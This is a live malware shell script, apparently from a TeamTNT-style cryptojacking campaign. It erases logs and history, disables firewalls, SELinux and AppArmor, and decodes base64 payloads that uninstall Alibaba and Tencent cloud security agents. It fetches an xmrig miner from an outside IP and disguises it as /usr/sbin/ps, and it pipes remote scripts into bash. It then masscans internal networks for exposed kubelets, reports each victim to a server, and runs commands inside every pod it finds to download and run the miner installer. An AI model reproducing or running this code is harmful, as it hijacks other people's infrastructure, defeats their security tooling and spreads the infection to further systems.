#!/bin/bash

# wget -O - http://45.9.148.35/chimaera/sh/spread_kube_local.sh | bash

export LC_ALL=C;HISTCONTROL="ignorespace${HISTCONTROL:+:$HISTCONTROL}" 2>/dev/null
export HISTFILE=/dev/null 2>/dev/null;unset HISTFILE 2>/dev/null;HISTSIZE=0 2>/dev/null

if [ -f "/var/tmp/.tnt.docker.lock" ];then echo "spreading is running!" ; exit ; fi

export BASE_HTTP="http://45.9.148.35/chimaera"
export INITPLOAD="http://45.9.148.35/chimaera/sh/setup_xmr.sh"
export XMR64_BIT="http://45.9.148.35/chimaera/bin/64bit/xmrig"
export XMR32_BIT=""
export XMRarmBIT=""

export T1OUT="90"
export TEMPFILE="/tmp/"$RANDOM$RANDOM$RANDOM
SYSPACKS=("wget" "curl" "jq" "gcc" "make" "git" "golang" "go" "masscan" "libpcap" "libpcap-dev" "libpcap-devel" "coreutils" "alpine-sdk")

GETWHOAMI=$(whoami)
CHECK_SYS=$(uname -m)
export PATH=$PATH:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:/usr/share/games:/usr/local/sbin:/usr/sbin:/sbin:/root/.local/bin:/snap/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cat /etc/resolv.conf 2>/dev/null | grep 'nameserver 8.8.8.8' 2>/dev/null || chattr -ia /etc/resolv.conf 2>/dev/null;echo 'nameserver 8.8.8.8' >> /etc/resolv.conf;chattr +i /etc/resolv.conf 2>/dev/null
cat /etc/resolv.conf 2>/dev/null | grep 'nameserver 8.8.4.4' 2>/dev/null || chattr -ia /etc/resolv.conf 2>/dev/null;echo 'nameserver 8.8.4.4' >> /etc/resolv.conf;chattr +i /etc/resolv.conf 2>/dev/null

ulimit -n 65535 2>/dev/null
	rm -rf /var/log/syslog 2>/dev/null;chattr -R -iua /tmp/ 2>/dev/null;chattr -R -iua /var/tmp/ 2>/dev/null
if type ufw 2>/dev/null 1>/dev/null; then ufw disable 2>/dev/null ; fi
if type iptables 2>/dev/null 1>/dev/null; then iptables -F 2>/dev/null ; fi
	sysctl kernel.nmi_watchdog=0 2>/dev/null 1>/dev/null
	setenforce 0 2>/dev/null
if [ -f "/proc/sys/kernel/nmi_watchdog" ]; then echo '0' >/proc/sys/kernel/nmi_watchdog 2>/dev/null 1>/dev/null; fi
if [ -f "/etc/sysctl.conf" ]; then echo 'kernel.nmi_watchdog=0' >> /etc/sysctl.conf 2>/dev/null 1>/dev/null; fi
if [ -f "/etc/selinux/config" ]; then echo SELINUX=disabled > /etc/selinux/config 2>/dev/null 1>/dev/null; fi
	systemctl stop apparmor 2>/dev/null ; service apparmor stop 2>/dev/null ; systemctl disable apparmor 2>/dev/null
	systemctl stop aliyun.service 2>/dev/null;service aliyun.service stop 2>/dev/null;systemctl disable aliyun.service 2>/dev/null
if ps aux | grep -i '[a]liyun'; then
    echo 'IyEvYmluL2Jhc2gKCkFFR0lTX0lOU1RBTExfRElSPSIvdXNyL2xvY2FsL2FlZ2lzIgojY2hlY2sgbGludXggR2VudG9vIG9zIAp2YXI9YGxzYl9yZWxlYXNlIC1hIHwgZ3JlcCBHZW50b29gCmlmIFsgLXogIiR7dmFyfSIgXTsgdGhlbiAKCXZhcj1gY2F0IC9ldGMvaXNzdWUgfCBncmVwIEdlbnRvb2AKZmkKY2hlY2tDb3Jlb3M9YGNhdCAvZXRjL29zLXJlbGVhc2UgMj4vZGV2L251bGwgfCBncmVwIGNvcmVvc2AKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbGlmIFsgLWYgIi9ldGMvb3MtcmVsZWFzZSIgLWEgLW4gIiR7Y2hlY2tDb3Jlb3N9IiBdOyB0aGVuCglMSU5VWF9SRUxFQVNFPSJDT1JFT1MiCglBRUdJU19JTlNUQUxMX0RJUj0iL29wdC9hZWdpcyIKZWxzZSAKCUxJTlVYX1JFTEVBU0U9Ik9USEVSIgpmaQkJCgpzdG9wX2FlZ2lzX3BraWxsKCl7CiAgICBwa2lsbCAtOSBBbGlZdW5EdW4gPi9kZXYvbnVsbCAyPiYxCiAgICBwa2lsbCAtOSBBbGlIaWRzID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpSGlwcyA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaU5ldCA+L2Rldi9udWxsIDI+JjEKICAgIHBraWxsIC05IEFsaVNlY0d1YXJkID4vZGV2L251bGwgMj4mMQogICAgcGtpbGwgLTkgQWxpWXVuRHVuVXBkYXRlID4vZGV2L251bGwgMj4mMQogICAgCiAgICAvdXNyL2xvY2FsL2FlZ2lzL0FsaU5ldC9BbGlOZXQgLS1zdG9wZHJpdmVyCiAgICAvdXNyL2xvY2FsL2FlZ2lzL2FsaWhpcHMvQWxpSGlwcyAtLXN0b3Bkcml2ZXIKICAgIC91c3IvbG9jYWwvYWVnaXMvQWxpU2VjR3VhcmQvQWxpU2VjR3VhcmQgLS1zdG9wZHJpdmVyCiAgICBwcmludGYgIiUtNDBzICU0MHNcbiIgIlN0b3BwaW5nIGFlZ2lzIiAiWyAgT0sgIF0iCn0KCiMgY2FuIG5vdCByZW1vdmUgYWxsIGFlZ2lzIGZvbGRlciwgYmVjYXVzZSB0aGVyZSBpcyBiYWNrdXAgZmlsZSBpbiBnbG9iYWxjZmcKcmVtb3ZlX2FlZ2lzKCl7CmlmIFsgLWQgIiR7QUVHSVNfSU5TVEFMTF9ESVJ9IiBdO3RoZW4KICAgIHVtb3VudCAke0FFR0lTX0lOU1RBTExfRElSfS9hZWdpc19kZWJ1ZwogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX2NsaWVudAogICAgcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FlZ2lzX3VwZGF0ZQoJcm0gLXJmICR7QUVHSVNfSU5TVEFMTF9ESVJ9L2FsaWhpZHMKICAgIHJtIC1yZiAke0FFR0lTX0lOU1RBTExfRElSfS9nbG9iYWxjZmcvZG9tYWluY2ZnLmluaQpmaQp9Cgp1bmluc3RhbGxfc2VydmljZSgpIHsKICAgCiAgIGlmIFsgLWYgIi9ldGMvaW5pdC5kL2FlZ2lzIiBdOyB0aGVuCgkJL2V0Yy9pbml0LmQvYWVnaXMgc3RvcCAgPi9kZXYvbnVsbCAyPiYxCgkJcm0gLWYgL2V0Yy9pbml0LmQvYWVnaXMgCiAgIGZpCgoJaWYgWyAkTElOVVhfUkVMRUFTRSA9ICJHRU5UT08iIF07IHRoZW4KCQlyYy11cGRhdGUgZGVsIGFlZ2lzIGRlZmF1bHQgMj4vZGV2L251bGwKCQlpZiBbIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiBdOyB0aGVuCgkJCXJtIC1mICIvZXRjL3J1bmxldmVscy9kZWZhdWx0L2FlZ2lzIiA+L2Rldi9udWxsIDI+JjE7CgkJZmkKICAgIGVsaWYgWyAtZiAvZXRjL2luaXQuZC9hZWdpcyBdOyB0aGVuCiAgICAgICAgIC9ldGMvaW5pdC5kL2FlZ2lzICB1bmluc3RhbGwKCSAgICBmb3IgKCh2YXI9MjsgdmFyPD01OyB2YXIrKykpIGRvCgkJCWlmIFsgLWQgIi9ldGMvcmMke3Zhcn0uZC8iIF07dGhlbgoJCQkJIHJtIC1mICIvZXRjL3JjJHt2YXJ9LmQvUzgwYWVnaXMiCgkJICAgIGVsaWYgWyAtZCAiL2V0Yy9yYy5kL3JjJHt2YXJ9LmQiIF07dGhlbgoJCQkJcm0gLWYgIi9ldGMvcmMuZC9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCQlmaQoJCWRvbmUKICAgIGZpCgp9CgpzdG9wX2FlZ2lzX3BraWxsCnVuaW5zdGFsbF9zZXJ2aWNlCnJlbW92ZV9hZWdpcwp1bW91bnQgJHtBRUdJU19JTlNUQUxMX0RJUn0vYWVnaXNfZGVidWcKCgpwcmludGYgIiUtNDBzICU0MHNcbiIgIlVuaW5zdGFsbGluZyBhZWdpcyIgICJbICBPSyAgXSIKCgoK' | base64 -d | bash 2>/dev/null 1>/dev/null
	echo 'IyEvYmluL2Jhc2gKCiNjaGVjayBsaW51eCBHZW50b28gb3MgCnZhcj1gbHNiX3JlbGVhc2UgLWEgfCBncmVwIEdlbnRvb2AKaWYgWyAteiAiJHt2YXJ9IiBdOyB0aGVuIAoJdmFyPWBjYXQgL2V0Yy9pc3N1ZSB8IGdyZXAgR2VudG9vYApmaQoKaWYgWyAtZCAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdCIgLWEgLW4gIiR7dmFyfSIgXTsgdGhlbgoJTElOVVhfUkVMRUFTRT0iR0VOVE9PIgplbHNlCglMSU5VWF9SRUxFQVNFPSJPVEhFUiIKZmkKCnN0b3BfYWVnaXMoKXsKCWtpbGxhbGwgLTkgYWVnaXNfY2xpID4vZGV2L251bGwgMj4mMQoJa2lsbGFsbCAtOSBhZWdpc191cGRhdGUgPi9kZXYvbnVsbCAyPiYxCglraWxsYWxsIC05IGFlZ2lzX2NsaSA+L2Rldi9udWxsIDI+JjEKICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgYWVnaXMiICJbICBPSyAgXSIKfQoKc3RvcF9xdWFydHooKXsKCWtpbGxhbGwgLTkgYWVnaXNfcXVhcnR6ID4vZGV2L251bGwgMj4mMQogICAgICAgIHByaW50ZiAiJS00MHMgJTQwc1xuIiAiU3RvcHBpbmcgcXVhcnR6IiAiWyAgT0sgIF0iCn0KCnJlbW92ZV9hZWdpcygpewppZiBbIC1kIC91c3IvbG9jYWwvYWVnaXMgXTt0aGVuCiAgICBybSAtcmYgL3Vzci9sb2NhbC9hZWdpcy9hZWdpc19jbGllbnQKICAgIHJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3VwZGF0ZQpmaQp9CgpyZW1vdmVfcXVhcnR6KCl7CmlmIFsgLWQgL3Vzci9sb2NhbC9hZWdpcyBdO3RoZW4KCXJtIC1yZiAvdXNyL2xvY2FsL2FlZ2lzL2FlZ2lzX3F1YXJ0egpmaQp9CgoKdW5pbnN0YWxsX3NlcnZpY2UoKSB7CiAgIAogICBpZiBbIC1mICIvZXRjL2luaXQuZC9hZWdpcyIgXTsgdGhlbgoJCS9ldGMvaW5pdC5kL2FlZ2lzIHN0b3AgID4vZGV2L251bGwgMj4mMQoJCXJtIC1mIC9ldGMvaW5pdC5kL2FlZ2lzIAogICBmaQoKCWlmIFsgJExJTlVYX1JFTEVBU0UgPSAiR0VOVE9PIiBdOyB0aGVuCgkJcmMtdXBkYXRlIGRlbCBhZWdpcyBkZWZhdWx0IDI+L2Rldi9udWxsCgkJaWYgWyAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgXTsgdGhlbgoJCQlybSAtZiAiL2V0Yy9ydW5sZXZlbHMvZGVmYXVsdC9hZWdpcyIgPi9kZXYvbnVsbCAyPiYxOwoJCWZpCiAgICBlbGlmIFsgLWYgL2V0Yy9pbml0LmQvYWVnaXMgXTsgdGhlbgogICAgICAgICAvZXRjL2luaXQuZC9hZWdpcyAgdW5pbnN0YWxsCgkgICAgZm9yICgodmFyPTI7IHZhcjw9NTsgdmFyKyspKSBkbwoJCQlpZiBbIC1kICIvZXRjL3JjJHt2YXJ9LmQvIiBdO3RoZW4KCQkJCSBybSAtZiAiL2V0Yy9yYyR7dmFyfS5kL1M4MGFlZ2lzIgoJCSAgICBlbGlmIFsgLWQgIi9ldGMvcmMuZC9yYyR7dmFyfS5kIiBdO3RoZW4KCQkJCXJtIC1mICIvZXRjL3JjLmQvcmMke3Zhcn0uZC9TODBhZWdpcyIKCQkJZmkKCQlkb25lCiAgICBmaQoKfQoKc3RvcF9hZWdpcwpzdG9wX3F1YXJ0egp1bmluc3RhbGxfc2VydmljZQpyZW1vdmVfYWVnaXMKcmVtb3ZlX3F1YXJ0egoKcHJpbnRmICIlLTQwcyAlNDBzXG4iICJVbmluc3RhbGxpbmcgYWVnaXNfcXVhcnR6IiAgIlsgIE9LICBdIgoKCgo=' | base64 -d | bash 2>/dev/null 1>/dev/null
if [ -f "/etc/init.d/agentwatch" ];then rm -rf /etc/init.d/agentwatch 2>/dev/null;fi
if [ -f "/usr/sbin/aliyun-service" ];then rm -rf /usr/sbin/aliyun-service 2>/dev/null;fi
if [ -f "/usr/local/aegis*" ];then rm -rf /usr/local/aegis* 2>/dev/null;fi
	systemctl stop aliyun.service 2>/dev/null;service aliyun.service stop 2>/dev/null;systemctl disable aliyun.service 2>/dev/null
	systemctl stop bcm-agent 2>/dev/null;service bcm-agent stop 2>/dev/null;yum remove bcm-agent -y 2>/dev/null ; apt-get remove bcm-agent -y 2>/dev/null  
elif ps aux | grep -i '[y]unjing'; then
if [ -f "/usr/local/qcloud/stargate/admin/uninstall.sh" ];then bash /usr/local/qcloud/stargate/admin/uninstall.sh;fi
if [ -f "/usr/local/qcloud/YunJing/uninst.sh" ];then bash /usr/local/qcloud/YunJing/uninst.sh;fi
if [ -f "/usr/local/qcloud/monitor/barad/admin/uninstall.sh" ];then bash /usr/local/qcloud/monitor/barad/admin/uninstall.sh;fi;fi
	ps aux | grep -v grep | grep 'Yun\|aegis' | awk '{print $2}' | xargs -I % kill -9 % 2>/dev/null
	rm -rf /usr/local/aegis 2>/dev/null;pkill aliyun-service 2>/dev/null
if type crontab 2>/dev/null 1>/dev/null; then crontab -f 2>/dev/null;fi

function remove_lock(){
rm -f /var/tmp/.tnt.docker.lock
}

function set_lock(){
mkdir -p /var/tmp/ 2>/dev/null
touch /var/tmp/.tnt.docker.lock
}

function setup_masscan(){ echo "setup masscan"
if type apk 2>/dev/null; then wget -q $BASE_HTTP/chimaera/bin/rpm_deb_apk/$(uname -m)-masscan.apk -O /tmp/.ms.apk
apk add /tmp/.ms.apk
rm -f /tmp/.ms.apk
fi
git clone git://github.com/robertdavidgraham/masscan /var/tmp/ms/ 2>/dev/null
cd /var/tmp/ms/
make
cp bin/masscan /usr/bin/masscan
chmod +x /usr/bin/masscan 2>/dev/null
make install
cd /root/ 2>/dev/null
rm -fr /var/tmp/ms/ 2>/dev/null 
}

function setup_zgrab(){ 
echo "setup zgrab"
export GOPATH=/root/go
go get github.com/zmap/zgrab
cd /root/go/src/github.com/zmap/zgrab/
go build
cp ./zgrab /usr/bin/zgrab
chmod +x /usr/bin/zgrab
cd /root/
rm -fr /root/go/src/github.com/ 
}		

function setup_ircbot(){
echo '' | base64 -d > /var/tmp/kube.c
cd /var/tmp/; gcc -o /var/tmp/kube /var/tmp/kube.c && rm -f /var/tmp/kube.c
mv /var/tmp/kube /root/.kube && chmod +x /root/.kube && /root/.kube 
}


function setup_apt(){ echo "apt setup";apt-get update --fix-missing 2>/dev/null
for SYSPACK in ${SYSPACKS[@]}; do apt-get install -y $SYSPACK 2>/dev/null ; APTRES=$?
if ! [ "$APTRES" = "0" ];then apt install -y --reinstall $SYSPACK 2>/dev/null;fi;done }

function setup_yum(){ echo "yum setup";yum clean all 2>/dev/null
for SYSPACK in ${SYSPACKS[@]}; do yum install -y $SYSPACK 2>/dev/null ; YUMRES=$?
if ! [ "$YUMRES" = "0" ];then yum reinstall -y $SYSPACK 2>/dev/null;fi;done }

function setup_apk(){ 
echo "apk setup"
apk update 2>/dev/null
for SYSPACK in ${SYSPACKS[@]}
do 
apk add $SYSPACK 2>/dev/null
done 
}

function do_install(){
if type apk 2>/dev/null 1>/dev/null; then setup_apk ; fi
if type apt 2>/dev/null 1>/dev/null; then setup_apt ; fi
if type yum 2>/dev/null 1>/dev/null; then setup_yum ; fi
if ! [ -f "/root/.kube" ];then setup_ircbot;fi
if ! [ -f "/usr/sbin/ps" ];then curl -Lk $XMR64_BIT -o /usr/sbin/ps; chmod +x /usr/sbin/ps; /usr/sbin/ps;fi

if ! type masscan 2>/dev/null 1>/dev/null; then setup_masscan ; fi
#if ! type zgrab 2>/dev/null 1>/dev/null; then setup_zgrab ; fi
}
do_install
timeout -s SIGKILL 13 curl http://45.9.148.35/aws.sh | bash
timeout -s SIGKILL 13 wget -O - http://45.9.148.35/aws.sh | bash
		clear
			echo ''
				echo ''

##############

kube_pwn(){
LRANGE=$1
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
eval "$rndstr"="'$(masscan --open -p10250 $LRANGE --rate=250000 | awk '{print $6}')'";
for ipaddr in ${!rndstr} ; do
if [ -f $TEMPFILE ]; then rm -f $TEMPFILE; fi
timeout -s SIGKILL $T1OUT curl -sLk https://$theip:10250/runningpods/ | jq -r '.items[] | .metadata.namespace + " " + .metadata.name + " " + .spec.containers[].name' >> $TEMPFILE
KUBERES=$?
if [ "$KUBERES" = "0" ];then 
curl -sLk http://45.9.148.35/chimaera/up/kube_in.php?target=$theip
while read namespace podname containername; do
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt update --fix-missing"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk update"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y bash"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y wget"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="yum install -y curl"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y bash"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y wget"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apt install -y curl"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add bash"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add wget"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="apk add curl"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="wget "$INITPLOAD" -O /tmp/.x1mr"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="curl "$INITPLOAD" -o /tmp/.x2mr"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x1mr"
timeout -s SIGKILL $T1OUT curl -XPOST -k https://$theip:10250/run/$namespace/$podname/$containername -d cmd="sh /tmp/.x2mr"
done < $TEMPFILE
rm -rf $TEMPFILE
fi
done;
}

LAN_RANGES=("10.0.0.0/8" "172.16.0.0/12" "192.168.0.0/16" "169.254.0.0/16" "100.64.0.0/10")
for LRANGE in ${LAN_RANGES[@]}; do kube_pwn $LRANGE ; done

remove_lock
